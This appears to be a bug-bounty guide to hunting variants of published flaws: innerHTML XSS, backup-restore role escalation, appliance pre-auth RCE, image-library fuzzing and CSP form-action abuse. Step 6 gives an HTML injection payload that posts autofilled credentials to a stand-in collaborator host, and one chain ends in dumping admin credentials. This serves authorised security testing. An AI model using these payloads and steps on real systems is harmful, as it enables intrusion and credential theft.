Step 1: Intel Drop (what just happened)

A researcher publishes a CVE, technique, or writeup. You read it. The question isn't "is this bug cool" — it's "does this pattern exist elsewhere?"

  1. Read the writeup. Identify the root cause, not the symptom.
  2. Ask: what technology/framework/pattern causes this?
  3. Ask: which other products use the same tech?
  4. Ask: did the researcher find the complete attack, or did they leave paths unexplored?

Step 2: Pattern Extract — Example: innerHTML XSS Without Equals

PortSwigger dropped this Nov 18. Here's how to variant-hunt it:

  1. Root cause: innerHTML sink processes HTML where = is stripped/filtered — but the technique doesn't need =
  2. Pattern: Any app that sanitizes by blocking = in user input before writing to innerHTML
  3. Who does this: WAFs that strip =, custom sanitizers, CSP workarounds that allow innerHTML but block attributes
  4. Grep your JS bundles: grep -rn 'innerHTML' dist/ | grep -v node_modules
  5. Grep your Caido traffic: look for responses where = gets stripped but < and > survive

Exact Steps — Apply to Any Target

1
Download the target's main JS bundle: curl -sL https://target/static/js/main.*.js -o main.js
2
Find innerHTML sinks: grep -n 'innerHTML\|insertAdjacentHTML\|document.write' main.js
3
Trace backward from each sink — does user input (URL params, postMessage, hash) flow into it?
4
If yes: check if = is filtered in that path. Test with ?param=test"onmouseover — does the = disappear?
5
If = is stripped: apply PortSwigger's equals-free payload from the writeup
6
Verify JS execution in browser. Capture screenshot. Done.
Kill signal: If the target uses a framework with auto-escaping (React, Angular default) and no dangerouslySetInnerHTML / [innerHTML] bindings, move on.

Step 3: Pattern Extract — Example: Backup Restore Privilege Escalation

Weblate Critical on H1. Backup import preserves role data = admin upgrade.

  1. Root cause: Import/restore function deserializes role information without validating against current user's permissions
  2. Pattern: Any app with project/team backup + restore that includes user roles in the export
  3. Who does this: Project management tools, CI/CD platforms, collaboration apps, any multi-tenant SaaS with import/export

Exact Steps — Apply to Any Target

1
Find backup/export feature. Create a project/workspace as a low-privilege user.
2
Export/backup the project. Download the file (usually ZIP with JSON/YAML config).
3
Unzip. Search for role fields: grep -ri 'role\|admin\|permission\|privilege' *.json *.yaml
4
Modify role field: change "role": "member" to "role": "admin" (or equivalent)
5
Re-zip. Import/restore the modified backup.
6
Check: did your privilege level change? Can you now access admin functions?
7
If yes: verify from a second account that the role change persists. Capture both states.
Kill signal: If the import function strips role/permission fields, or if roles are assigned server-side from the authenticated user's current permissions rather than the import data, it's patched.

Step 4: Pattern Extract — Example: Appliance Pre-Auth RCE (watchTowr Pattern)

Barracuda, PaperCut, Citrix, F5 — four different vendors, same pattern: network appliances with pre-auth RCE.

  1. Root cause: Enterprise network appliances expose management interfaces with pre-auth vulnerabilities
  2. Pattern: Vendor patches one CVE but the underlying codebase has the same anti-pattern elsewhere
  3. Variant hunt approach: When a CVE drops for Vendor X, check: (a) did the patch fix the root cause or just the specific path? (b) are there adjacent endpoints with the same pattern?

Exact Steps — Appliance Variant Hunting

1
Read the full writeup (watchTowr is gold for this — they always explain the root cause)
2
Identify the vulnerable code pattern (e.g., unsanitized header → eval, path traversal in file param)
3
Download the patch diff: diff old_firmware new_firmware — what exactly changed?
4
Search the rest of the codebase for the same pattern the patch fixed
5
If you find it: that's your variant. Build a PoC against the unpatched path.
6
Check other products from the same vendor — shared codebases are common (e.g., Citrix Gateway / NetScaler / ADC)
Chain opportunity: Pre-auth file read (Atlassian CVE-2026-21589) → read DB config → connect to DB → dump admin creds → full compromise. This chain doesn't need a separate RCE if file read gives you secrets.

Step 5: Pattern Extract — Example: Image Processing Memory Corruption

Basecamp Critical — TIFF/JPEG heap overflow in image upload. Heartbleed-era class of bug, still alive in 2026.

  1. Root cause: Server-side image processing (resize, thumbnail, format conversion) with libraries that have heap corruption bugs
  2. Who is affected: Any target that processes uploaded images server-side — which is basically everyone
  3. Key libraries: ImageMagick, libvips, Sharp (Node.js), Pillow (Python), GD (PHP)

Exact Steps — Image Processing Fuzzing

1
Find image upload endpoints: avatar, profile pic, attachments, media library
2
Fingerprint the processing library: upload a valid image, check response headers, error messages, or EXIF in output
3
Check known CVEs for that library version: python3 tools/cve_surface_mapper.py --product imagemagick
4
Upload crafted images: oversized TIFF headers, malformed JPEG markers, polyglot PNG/SVG
5
Watch for: 500 errors (crash), unusual response timing (hang), truncated responses (memory corruption)
6
If crash confirmed: escalate to memory read (leak secrets) or write (code execution)
Kill signal: If images are processed client-side only (browser resize before upload) or via a managed CDN service (Cloudinary, imgix) with no server-side processing, move on.

Step 6: CSP Credential Theft — Turning Defense Into Offense

PortSwigger Nov 11. CSP's form-action directive doesn't fall back to default-src. Inject a form + meta refresh = steal creds without JS.

Exact Steps

1
Find any reflected HTML injection on the target (even with strict CSP blocking scripts)
2
Check the CSP header: curl -sI https://target/ | grep -i content-security-policy
3
Look for: missing form-action directive, or form-action set to *
4
If missing/permissive: inject <form action="https://YOUR-COLLAB/x"><input name=username><input name=password></form><meta http-equiv="refresh" content="0">
5
The browser auto-submits the form with any autofilled credentials to your server
6
Check your Collaborator/Interactsh for the POST with stolen creds
Chain: This upgrades ANY reflected HTML injection from "informational" to "credential theft" on targets without form-action in CSP. Re-check every parked HTML injection lead.
